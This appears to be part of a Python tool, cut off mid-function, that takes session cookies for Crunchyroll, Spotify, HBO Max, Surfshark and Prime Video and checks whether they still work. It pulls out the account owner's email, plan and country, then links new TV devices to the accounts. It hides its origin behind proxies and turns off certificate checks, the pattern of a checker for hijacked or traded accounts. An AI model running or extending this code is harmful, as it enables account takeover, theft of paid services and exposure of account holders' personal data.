# Crunchyroll Service Helper Logic
# ==========================================
CRUNCHY_USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"

def get_user_agent():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"

def crunchyroll_parse_cookie_content(content):
    if not content:
        return None
    cookies = {}
    try:
        content_str = content.strip()
        # 1. Try JSON format (e.g. Cookie-Editor, EditThisCookie)
        if content_str.startswith('[') or content_str.startswith('{'):
            try:
                data = json.loads(content_str)
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict) and "name" in item and "value" in item:
                            cookies[str(item["name"]).strip()] = str(item["value"]).strip()
                elif isinstance(data, dict):
                    for k, v in data.items():
                        cookies[str(k).strip()] = str(v).strip()
            except Exception:
                pass

        # 2. Try Netscape or Key=Value line by line
        if 'etp_rt' not in cookies:
            lines = content_str.split('\n')
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    if line.startswith('#HttpOnly_'):
                        line = line[10:].strip()
                    else:
                        continue

                # Handle both tabs and multiple spaces in Netscape format
                parts = re.split(r'\t+|\s{2,}', line)
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    if name and value:
                        cookies[name] = value
                elif '=' in line:
                    try:
                        pairs = line.split(';')
                        for pair in pairs:
                            if '=' in pair:
                                n, v = pair.strip().split('=', 1)
                                if n.strip() and v.strip():
                                    cookies[n.strip()] = v.strip()
                    except Exception:
                        pass

        # 3. Fallback regex search for etp_rt
        if 'etp_rt' not in cookies:
            etp_match = re.search(r'etp_rt[\s:=]+([a-zA-Z0-9_-]+)', content_str, re.IGNORECASE)
            if etp_match:
                cookies['etp_rt'] = etp_match.group(1).strip()
    except Exception:
        pass
    return cookies if 'etp_rt' in cookies else None


def crunchyroll_validate_cookie(cookies, proxy=None):
    if not cookies or 'etp_rt' not in cookies:
        return "dead", None, None, None

    def _do_validate(p):
        try:
            user_agent = CRUNCHY_USER_AGENT
            token_headers = {
                "User-Agent": user_agent,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/activate",
                "ETP-Anonymous-Id": cookies.get('ajs_anonymous_id', str(uuid.uuid4()))
            }

            req_cookies = {k: v for k, v in cookies.items() if isinstance(v, str)}
            token_data = f"device_id={str(uuid.uuid4())}&device_type=Chrome%20on%20Android&grant_type=etp_rt_cookie"

            session = requests.Session()
            resp = session.post(
                "https://www.crunchyroll.com/auth/v1/token",
                headers=token_headers,
                data=token_data,
                cookies=req_cookies,
                proxies=p,
                timeout=18,
                verify=False
            )

            if resp.status_code == 200:
                token_data_json = resp.json()
                access_token = token_data_json.get('access_token', '')
                account_id = token_data_json.get('account_id', '') or token_data_json.get('profile_id', '')

                if not access_token:
                    return "dead", None, None, None

                headers = {"User-Agent": user_agent, "Authorization": f"Bearer {access_token}"}
                email = "N/A"
                external_id = account_id
                try:
                    me_resp = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, cookies=req_cookies, proxies=p, timeout=10, verify=False)
                    if me_resp.status_code == 200:
                        me_data = me_resp.json()
                        email = me_data.get('email', 'N/A')
                        external_id = me_data.get('external_id', account_id)
                except Exception:
                    pass

                plan_type = "PREMIUM"
                country = "Unknown"
                try:
                    if external_id:
                        benefits_resp = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=headers, cookies=req_cookies, proxies=p, timeout=10, verify=False)
                        if benefits_resp.status_code == 200:
                            ben_text = benefits_resp.text
                            country_match = re.search(r'"subscription_country":"([^"]+)"', ben_text)
                            if country_match:
                                country_code = country_match.group(1)
                                country_map = {"US": "United States", "GB": "United Kingdom", "IN": "India", "CA": "Canada", "AU": "Australia", "DE": "Germany", "FR": "France", "BR": "Brazil", "JP": "Japan"}
                                country = country_map.get(country_code, country_code)

                            streams_match = re.search(r'"benefit":"concurrent_([^"]+)"', ben_text)
                            if streams_match:
                                streams = streams_match.group(1)
                                plan_map = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
                                plan_type = plan_map.get(streams, "PREMIUM")
                except Exception:
                    pass

                auth_data = {
                    "access_token": access_token,
                    "email": email,
                    "working_proxy": p
                }
                return "valid", country, plan_type, auth_data

            # Explicit OAuth dead cookie check - NEVER mark dead on Cloudflare 403 HTML!
            is_explicitly_dead = False
            try:
                err_json = resp.json()
                if isinstance(err_json, dict):
                    err_code = str(err_json.get('error', '')).lower()
                    err_desc = str(err_json.get('error_description', '')).lower()
                    if any(k in err_code for k in ('invalid_grant', 'unauthorized', 'invalid_token')) or 'refresh token' in err_desc or 'expired' in err_desc:
                        is_explicitly_dead = True
            except Exception:
                pass

            if is_explicitly_dead:
                return "dead", None, None, None

            # Any other response (Cloudflare 403, 429, 502, network issues) is network_error, preserving the cookie!
            return "network_error", None, None, None

        except Exception:
            return "network_error", None, None, None

    # Strict Proxy Mode: Only validate through proxy, never leak or use direct local IP
    if proxy is not None:
        return _do_validate(proxy)

    # If no proxy configured, return network_error
    return "network_error", None, None, None


def crunchyroll_submit_tv_code(auth_data, tv_code, proxy=None):
    access_token = auth_data.get("access_token")
    if not access_token:
        return {"success": False, "error": "dead_cookie"}

    user_agent = CRUNCHY_USER_AGENT
    activation_headers = {
        "User-Agent": user_agent,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/activate",
        "ETP-Anonymous-Id": str(uuid.uuid4())
    }

    activation_data = {"user_code": tv_code.upper()}

    try:
        session = requests.Session()
        r = session.post(
            "https://www.crunchyroll.com/auth/v1/device",
            headers=activation_headers,
            json=activation_data,
            proxies=proxy,
            timeout=25,
            verify=False
        )

        if r.status_code == 200:
            return {"success": True, "error": None}
        else:
            error_msg = "TV Activation Failed"
            is_dead = False
            try:
                error = r.json()
                if error and 'code' in error:
                    error_code = str(error['code']).lower()
                    if any(k in error_code for k in ("user_code_activation_failure", "forbidden", "not_found", "invalid_code", "expired")):
                        error_msg = "Invalid or expired TV code"
                    elif "unauthorized" in error_code or "invalid_token" in error_code:
                        error_msg = "dead_cookie"
                        is_dead = True
                    else:
                        error_msg = f"Error: {error.get('message', error_code)}"
            except Exception:
                pass

            if r.status_code == 401 and not is_dead and error_msg == "TV Activation Failed":
                error_msg = "dead_cookie"

            return {"success": False, "error": error_msg}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)}"}


# ==========================================
# Spotify Service Helper Logic
# ==========================================
def spotify_parse_cookie_content(content):
    cookies = {}
    try:
        # First try JSON parsing
        try:
            j_data = json.loads(content)
            if isinstance(j_data, list):
                for item in j_data:
                    if isinstance(item, dict) and 'name' in item and 'value' in item:
                        cookies[item['name']] = item['value']
            elif isinstance(j_data, dict):
                if 'cookies' in j_data and isinstance(j_data['cookies'], list):
                    for item in j_data['cookies']:
                        if isinstance(item, dict) and 'name' in item and 'value' in item:
                            cookies[item['name']] = item['value']
                else:
                    for k, v in j_data.items():
                        if isinstance(v, str):
                            cookies[k] = v
        except Exception:
            pass

        if not cookies:
            lines = content.strip().split('\n')
            for line in lines:
                line_str = line.strip()
                if not line_str or (line_str.startswith('#') and not line_str.startswith('#HttpOnly_')):
                    continue
                if line_str.startswith('#HttpOnly_'):
                    line_str = line_str[len('#HttpOnly_'):]
                
                parts = line_str.split('\t')
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    cookies[name] = value
                elif '=' in line_str:
                    sub_parts = line_str.split(';')
                    for sp in sub_parts:
                        if '=' in sp:
                            try:
                                name, value = sp.strip().split('=', 1)
                                cookies[name.strip()] = value.strip()
                            except:
                                pass
        return cookies if cookies else None
    except:
        return None

def spotify_validate_cookie(cookies, proxy=None):
    if not cookies:
        return "dead", None, None, None
        
    try:
        session = requests.Session()
        for k, v in cookies.items():
            session.cookies.set(k, v, domain=".spotify.com")
        
        headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://open.spotify.com/'
        }

        email = None
        country = None
        plan = None

        # 1. Try Spotify Web Player access token endpoint
        try:
            r_token = session.get("https://open.spotify.com/get_access_token?reason=transport&productType=web_player", headers=headers, proxies=proxy, timeout=12, verify=False)
            if r_token.status_code == 200:
                token_json = r_token.json()
                if isinstance(token_json, dict) and not token_json.get('isAnonymous', True):
                    access_token = token_json.get('accessToken')
                    user_data = token_json.get('user', {})
                    country = user_data.get('country')
                    product = user_data.get('product')
                    if product:
                        plan = f"Spotify {product.capitalize()}" if "spotify" not in str(product).lower() else str(product)
                        
                    if access_token:
                        try:
                            r_me = requests.get("https://api.spotify.com/v1/me", headers={'Authorization': f'Bearer {access_token}', 'User-Agent': USER_AGENT}, proxies=proxy, timeout=10)
                            if r_me.status_code == 200:
                                me_json = r_me.json()
                                email = me_json.get('email')
                                if not country:
                                    country = me_json.get('country')
                                if not plan and me_json.get('product'):
                                    p = me_json.get('product')
                                    plan = f"Spotify {p.capitalize()}" if "spotify" not in str(p).lower() else str(p)
                        except Exception:
                            pass
        except Exception:
            pass

        # 2. Try Spotify internal user API endpoint
        if not email or not plan:
            try:
                r_user = session.get("https://www.spotify.com/api/account/v1/user/", headers=headers, proxies=proxy, timeout=10, verify=False)
                if r_user.status_code == 200:
                    user_json = r_user.json()
                    if isinstance(user_json, dict):
                        if not email:
                            email = user_json.get('email') or user_json.get('email_address')
                        if not country:
                            country = user_json.get('country') or user_json.get('market')
                        if not plan:
                            product = user_json.get('product') or user_json.get('plan')
                            if product:
                                plan = f"Spotify {product.capitalize()}" if "spotify" not in str(product).lower() else str(product)
            except Exception:
                pass

        # 3. Fetch Account Overview page if still missing details
        html = ""
        if not email or not plan:
            page_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Cache-Control': 'max-age=0'
            }
            try:
                url = "https://www.spotify.com/us/account/overview/"
                response = session.get(url, headers=page_headers, allow_redirects=True, proxies=proxy, timeout=15, verify=False)
                if response.status_code == 200 and "/login" not in response.url:
                    html = response.text
                else:
                    url = "https://www.spotify.com/account/subscription/manage/"
                    response = session.get(url, headers=page_headers, allow_redirects=True, proxies=proxy, timeout=15, verify=False)
                    if response.status_code == 200 and "/login" not in response.url:
                        html = response.text
            except Exception:
                pass

        # 4. Parse __NEXT_DATA__ JSON blob
        if html:
            next_data_match = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html, re.DOTALL)
            if next_data_match:
                try:
                    data = json.loads(next_data_match.group(1))
                    page_props = data.get('props', {}).get('pageProps', {})
                    account_data = page_props.get('account', {}) or page_props.get('userData', {}) or page_props.get('user', {}) or page_props
                    
                    if not plan:
                        plan = (
                            account_data.get('planNameLong') or
                            account_data.get('planName') or
                            account_data.get('product') or
                            account_data.get('tier')
                        )
                        if isinstance(plan, dict):
                            plan = plan.get('name') or plan.get('title')
                            
                    if not email:
                        email = account_data.get('email') or page_props.get('email')
                    if not country:
                        country = account_data.get('country') or page_props.get('country') or account_data.get('market')
                except Exception:
                    pass

        # Regex & Cookie fallbacks for Country
        if not country or len(str(country)) != 2 or str(country).upper() == "UNKNOWN":
            for k, v in cookies.items():
                if k.lower() in ("country", "sp_m", "market") and len(str(v).strip()) == 2:
                    country = str(v).strip().upper()
                    break

        # Regex fallback for Plan
        if not plan and html:
            plan_patterns = [
                r'"planNameLong"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
                r'"product"\s*:\s*"([^"]+)"',
                r'"plan_name"\s*:\s*"([^"]+)"',
                r'class="[^"]*plan-name[^"]*">([^<]+)<'
            ]
            for pat in plan_patterns:
                m = re.search(pat, html, re.IGNORECASE)
                if m:
                    plan = m.group(1).strip()
                    break

        if not plan:
            plan = "Spotify Premium"

        # Final sanitization
        email = str(email).strip() if email and "@" in str(email) else "N/A"
        country = str(country).strip().upper() if country and len(str(country).strip()) == 2 else "Unknown"

        plan_lower = str(plan).lower()
        is_free = "free" in plan_lower and "premium" not in plan_lower
        is_premium = not is_free

        if is_premium:
            auth_data = {
                "cookies": cookies,
                "email": email,
                "plan": plan,
                "country": country
            }
            return "valid", country, plan, auth_data
        else:
            return "dead", None, None, None

    except Exception:
        return "network_error", None, None, None

def spotify_get_csrf_token(cookies, proxy=None):
    try:
        session = requests.Session()
        for k, v in cookies.items():
            session.cookies.set(k, v, domain=".spotify.com")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'referer': 'https://www.spotify.com/'
        }
        
        flow_ctx = f"{uuid.uuid4()}%3A{int(time.time())}"
        url = f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow_ctx}"
        
        response = session.get(url, headers=headers, allow_redirects=True, proxies=proxy, timeout=15, verify=False)
        
        if response.status_code != 200:
            # Fallback to direct pair page
            url = f"https://accounts.spotify.com/pair"
            response = session.get(url, headers=headers, allow_redirects=True, proxies=proxy, timeout=15, verify=False)
            if response.status_code != 200:
                return None, None, None
        
        html = response.text
        
        csrf_token = None
        patterns = [
            r'initialToken":"([^"]+)"',
            r'csrfToken":"([^"]+)"',
            r'"csrf_token":"([^"]+)"',
            r'name="csrf_token"\s+value="([^"]+)"'
        ]
        for p in patterns:
            match = re.search(p, html)
            if match:
                csrf_token = match.group(1)
                break
                
        if not csrf_token:
            csrf_token = session.cookies.get('sp_t') or session.cookies.get('csrf_token')
        
        flow_pattern = r'flow_ctx=([^"\s&]+)'
        flow_match = re.search(flow_pattern, html)
        if flow_match:
            flow_ctx = flow_match.group(1)
        
        updated_cookies = cookies.copy()
        for cookie in session.cookies:
            updated_cookies[cookie.name] = cookie.value
        
        return csrf_token, flow_ctx, updated_cookies
        
    except:
        return None, None, None

def spotify_submit_tv_code(auth_data, tv_code, proxy=None):
    cookies = auth_data.get("cookies")
    if not cookies:
        return {"success": False, "error": "Invalid auth cookies"}

    # Extract 6-character activation code if tv_code is a URL or QR payload
    code_to_submit = tv_code.strip()
    if "spotify" in code_to_submit.lower() or "http" in code_to_submit.lower() or "/" in code_to_submit or "=" in code_to_submit or ":" in code_to_submit:
        match = re.search(r'[?&](?:code|c)=([a-zA-Z0-9]{6})', code_to_submit, re.IGNORECASE)
        if match:
            code_to_submit = match.group(1)
        else:
            match_path = re.search(r'(?:/pair/|:pair:|^/)([a-zA-Z0-9]{6})(?:[/?#:]|$)', code_to_submit, re.IGNORECASE)
            if match_path:
                code_to_submit = match_path.group(1)
            else:
                tokens = re.findall(r'(?<![a-zA-Z0-9])([a-zA-Z0-9]{6})(?![a-zA-Z0-9])', code_to_submit)
                for token in tokens:
                    if token.lower() not in ("spotify", "https", "http", "accounts", "pair"):
                        code_to_submit = token
                        break
        
    csrf, flow, updated_cookies = spotify_get_csrf_token(cookies, proxy)
    if not csrf or not flow:
        return {"success": False, "error": "Failed to retrieve Spotify auth tokens"}
        
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8,ru;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://accounts.spotify.com',
        'referer': f'https://accounts.spotify.com/en/link/v2?flow_ctx={flow}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
    
    if csrf:
        headers['x-csrf-token'] = csrf
        
    try:
        r1 = requests.post(
            f"https://accounts.spotify.com/pair/api/code?flow_ctx={flow}",
            headers=headers,
            cookies=updated_cookies,
            json={"code": code_to_submit.upper().strip()},
            proxies=proxy,
            timeout=15,
            verify=False
        )
        
        if r1.status_code != 200:
            if r1.status_code in (401, 403):
                return {"success": False, "error": "dead_cookie"}
            return {"success": False, "error": f"Verification endpoint error ({r1.status_code})"}
            
        data = r1.json()
        if data.get('result') == 'invalid':
            return {"success": False, "error": "Invalid or expired TV code"}
        if data.get('result') != 'ok':
            return {"success": False, "error": f"Verification failed: {data.get('result')}"}
            
        tv_name = data.get('codeInfo', {}).get('authorizationInfo', {}).get('clientInfo', {}).get('name', 'Unknown TV')
        
        r2 = requests.post(
            f"https://accounts.spotify.com/pair/api/resolve?flow_ctx={flow}",
            headers=headers,
            cookies=updated_cookies,
            json={"code": code_to_submit.upper().strip()},
            proxies=proxy,
            timeout=15,
            verify=False
        )
        
        if r2.status_code != 200:
            if r2.status_code in (401, 403):
                return {"success": False, "error": "dead_cookie"}
            return {"success": False, "error": f"Activation endpoint error ({r2.status_code})"}
            
        result_str = r2.json().get('result', '')
        if result_str in ['ok', 'success']:
            return {"success": True, "error": None, "tv_name": tv_name}
            
        return {"success": False, "error": f"Activation failed: {result_str}"}
        
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)}"}


# ==========================================
# HBO Max Service Helper Logic
# ==========================================
HBOMAX_ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

HBOMAX_USER_INFO_ENDPOINTS = {
    "amer": "https://default.beam-amer.prd.api.hbomax.com/users/me",
    "emea": "https://default.beam-emea.prd.api.hbomax.com/users/me",
    "latam": "https://default.beam-latam.prd.api.hbomax.com/users/me",
    "apac": "https://default.beam-apac.prd.api.hbomax.com/users/me",
}

def hbomax_extract_st_token(content):
    if not content:
        return None
    # 1. JSON format cookie parsing
    stripped = content.strip()
    if stripped.startswith(("[", "{")):
        try:
            data = json.loads(stripped)
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        c_name = str(item.get("name", "")).lower()
                        if c_name in ("st", "st_token", "token") and item.get("value"):
                            val = str(item["value"]).strip()
                            if len(val) > 30:
                                return val
            elif isinstance(data, dict):
                if "cookies" in data and isinstance(data["cookies"], list):
                    for item in data["cookies"]:
                        if isinstance(item, dict):
                            c_name = str(item.get("name", "")).lower()
                            if c_name in ("st", "st_token", "token") and item.get("value"):
                                val = str(item["value"]).strip()
                                if len(val) > 30:
                                    return val
                for k in ("st", "st_token", "token"):
                    if k in data and isinstance(data[k], str) and len(data[k].strip()) > 30:
                        return data[k].strip()
        except Exception:
            pass

    # 2. Netscape format (tab-delimited lines)
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            c_name = parts[5].strip().lower()
            c_val = parts[6].strip()
            if c_name in ("st", "st_token", "token") and len(c_val) > 30:
                return c_val.strip('"\'')

    # 3. Word-bounded regex (e.g. st=... or cookie header)
    match = re.search(r'(?:^|[\s;\t,])(?:st|st_token|token)[=\s\t]+([A-Za-z0-9_\-\.]+)', content, re.IGNORECASE)
    if match and len(match.group(1).strip()) > 30:
        return match.group(1).strip().rstrip(';').strip('"\'')

    # 4. Raw JWT token fallback
    jwt_match = re.search(r'\b(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})\b', content)
    if jwt_match:
        return jwt_match.group(1).strip()

    return None

def hbomax_validate_cookie(st_token, proxy=None):
    if not st_token:
        return "dead", None, None, None
        
    headers = {
        "accept": "*/*",
        "cookie": f"st={st_token}",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "STONEJS/1 (Unknown/Unknown; Linux/undefined; Unknown)",
    }
    
    unauthorized_count = 0
    network_error_count = 0
    
    for region, url in HBOMAX_USER_INFO_ENDPOINTS.items():
        try:
            r = requests.get(url, headers=headers, proxies=proxy, timeout=15, verify=False)
            if r.status_code == 200:
                data = r.json()
                user_data = data.get('data', {}).get('attributes', {})
                email = user_data.get('username', 'Unknown')
                if email and '@' not in email:
                    email = f"{email}@hbomax.com"
                
                auth_data = {
                    "st_token": st_token,
                    "region": region,
                    "email": email
                }
                return "valid", region, "Premium", auth_data
            elif r.status_code == 401:
                unauthorized_count += 1
            else:
                network_error_count += 1
        except Exception:
            network_error_count += 1
            
    if network_error_count > 0:
        return "network_error", None, None, None
    else:
        return "dead", None, None, None

def hbomax_submit_tv_code(auth_data, tv_code, proxy=None):
    st_token = auth_data.get("st_token")
    region = auth_data.get("region")
    
    if not st_token or not region:
        return {"success": False, "error": "Invalid authentication data"}
        
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "STONEJS/1 (Unknown/Unknown; Linux/undefined; Unknown)",
    }
    
    try:
        payload = {"linkingCode": tv_code.upper()}
        
        r1 = requests.post(HBOMAX_ENDPOINTS[region]["validate"], headers=headers, json=payload, proxies=proxy, timeout=30, verify=False)
        if r1.status_code not in [200, 204]:
            if r1.status_code == 401:
                return {"success": False, "error": "dead_cookie"}
            err_msg = "Validation failed"
            try:
                err_json = r1.json()
                if "errors" in err_json and isinstance(err_json["errors"], list) and len(err_json["errors"]) > 0:
                    err_msg = err_json["errors"][0].get("detail", err_msg)
                elif "error" in err_json:
                    err_msg = err_json.get("error", {}).get("message", err_msg)
            except:
                pass
            if "unauthorized" in err_msg.lower() or "token" in err_msg.lower() or "invalid credentials" in err_msg.lower():
                return {"success": False, "error": "dead_cookie"}
            return {"success": False, "error": f"Invalid or expired TV code ({err_msg})"}
            
        time.sleep(1)
        
        r2 = requests.post(HBOMAX_ENDPOINTS[region]["connect"], headers=headers, json=payload, proxies=proxy, timeout=30, verify=False)
        if r2.status_code in [200, 204]:
            return {"success": True, "error": None}
        else:
            if r2.status_code == 401:
                return {"success": False, "error": "dead_cookie"}
            err_msg = "Connection failed"
            try:
                err_json = r2.json()
                if "errors" in err_json and isinstance(err_json["errors"], list) and len(err_json["errors"]) > 0:
                    err_msg = err_json["errors"][0].get("detail", err_msg)
                elif "error" in err_json:
                    err_msg = err_json.get("error", {}).get("message", err_msg)
            except:
                pass
            if "unauthorized" in err_msg.lower() or "token" in err_msg.lower() or "invalid credentials" in err_msg.lower():
                return {"success": False, "error": "dead_cookie"}
            return {"success": False, "error": err_msg}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)}"}


# ==========================================
# Surfshark Service Helper Logic
# ==========================================
SURFSHARK_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def surfshark_parse_cookie_content(content) -> dict:
    cookies = {}
    try:
        try:
            data = json.loads(content)
            if isinstance(data, dict):
                data = data.get("cookies") or data.get("items") or [data]
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and "name" in item and "value" in item:
                        cookies[item["name"]] = item["value"]
        except:
            pass
            
        if not cookies:
            for line in content.split('\n'):
                line = line.strip()
                if not line:
                    continue
                if line.startswith('#') and not line.startswith('#HttpOnly_'):
                    continue
                clean_line = line
                if line.startswith('#HttpOnly_'):
                    clean_line = line[10:]
                
                parts = re.split(r'\t+|\s{2,}', clean_line)
                parts = [p for p in parts if p]
                
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    cookies[name] = value
                elif '=' in clean_line and not clean_line.startswith('#'):
                    parts = clean_line.split('=', 1)
                    if len(parts) == 2:
                        cookies[parts[0].strip()] = parts[1].strip()
    except Exception as e:
        print(f"Error parsing Surfshark cookie: {e}")
    return cookies

def surfshark_validate_cookie(cookies, proxy=None):
    if not cookies or '_sstk' not in cookies:
        return "dead", None, None, None
        
    cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    headers = {
        "authority": "my.surfshark.com",
        "accept": "*/*",
        "user-agent": SURFSHARK_USER_AGENT,
        "cookie": cookie_string,
    }
    
    try:
        r = requests.get("https://my.surfshark.com/account/p_api/v1/account/user", headers=headers, proxies=proxy, timeout=30, verify=False)
        if r.status_code == 200:
            data = r.json()
            email = data.get("email") or data.get("username") or "SurfsharkUser"
            
            # Fetch subscription details
            plan = "Active Subscription"
            expiry = "Lifetime / Recurring"
            try:
                r_sub = requests.get("https://my.surfshark.com/account/p_api/v1/account/subscription", headers=headers, proxies=proxy, timeout=30, verify=False)
                if r_sub.status_code == 200:
                    sub_data = r_sub.json()
                    sub = sub_data[0] if isinstance(sub_data, list) and len(sub_data) > 0 else sub_data
                    if sub:
                        status = sub.get("status", "active")
                        if status != "active":
                            return "dead", None, None, None
                        
                        expires_at = sub.get("expires_at") or sub.get("expiration_date") or sub.get("renew_date")
                        if expires_at:
                            expiry = expires_at.split("T")[0]
                        plan = sub.get("product_name") or sub.get("plan_name") or sub.get("plan", {}).get("name") or "Surfshark Premium"
            except:
                pass
                
            return "valid", "Global", f"{plan} (Expires: {expiry})", {"cookies": cookies, "email": email, "plan": plan, "expiry": expiry}
        elif r.status_code in (400, 401):
            return "dead", None, None, None
        else:
            return "network_error", None, None, None
    except Exception:
        return "network_error", None, None, None

def surfshark_submit_tv_code(auth_data, tv_code, proxy=None):
    cookies = auth_data.get("cookies")
    if not cookies:
        return {"success": False, "error": "Invalid auth cookies"}
        
    cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    headers = {
        "authority": "my.surfshark.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://my.surfshark.com",
        "referer": "https://my.surfshark.com/account/login-code",
        "user-agent": SURFSHARK_USER_AGENT,
        "cookie": cookie_string,
    }
    
    data = {"code": tv_code.upper().strip()}
    
    try:
        response = requests.post(
            "https://my.surfshark.com/account/p_api/v1/account/authorization/assign",
            headers=headers,
            json=data,
            proxies=proxy,
            timeout=30,
            verify=False
        )
        
        if response.status_code == 200:
            return {"success": True, "error": None}
        elif response.status_code == 400:
            return {"success": False, "error": "Invalid or expired TV code"}
        elif response.status_code == 401:
            return {"success": False, "error": "dead_cookie"}
        else:
            return {"success": False, "error": f"Activation failed ({response.status_code})"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)}"}


# ==========================================
# Prime Video Service Helper Logic (Amazon Prime Video Pairing)
# ==========================================
AMZ_CBL_URL = "https://www.amazon.com/a/code"
PV_BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
)
PV_HDRS = {
    "User-Agent": PV_BROWSER_UA,
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

def primevideo_parse_cookie_content(raw_text: str) -> dict:
    """Parses Netscape cookies.txt, JSON (array or dict), or key=value format into cookie dict."""
    if not raw_text:
        return {}
    s = raw_text.strip()
    # 1. JSON format (array or object)
    try:
        data = json.loads(s)
        ck = {}
        if isinstance(data, dict):
            if "cookies" in data and isinstance(data["cookies"], list):
                data = data["cookies"]
            elif "items" in data and isinstance(data["items"], list):
                data = data["items"]
            else:
                for k, v in data.items():
                    if isinstance(v, (str, int, float, bool)):
                        ck[str(k).strip()] = str(v).strip()
                if ck:
                    return ck
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict) and "name" in c and "value" in c:
                    ck[str(c["name"]).strip()] = str(c["value"]).strip()
            if ck:
                return ck
    except Exception:
        pass

    # 2. Netscape tab-delimited or whitespace-separated
    ck = {}
    for line in s.splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        p = line.split("\t")
        if len(p) >= 7 and p[5].strip():
            ck[p[5].strip()] = "\t".join(p[6:]).strip().strip('"')
        else:
            parts = re.split(r"\s+", line)
            if len(parts) >= 7 and parts[5].strip():
                ck[parts[5].strip()] = " ".join(parts[6:]).strip().strip('"')
    if ck:
        return ck

    # 3. Semicolon key=value format
    if "=" in s:
        for chunk in s.split(";"):
            chunk = chunk.strip()
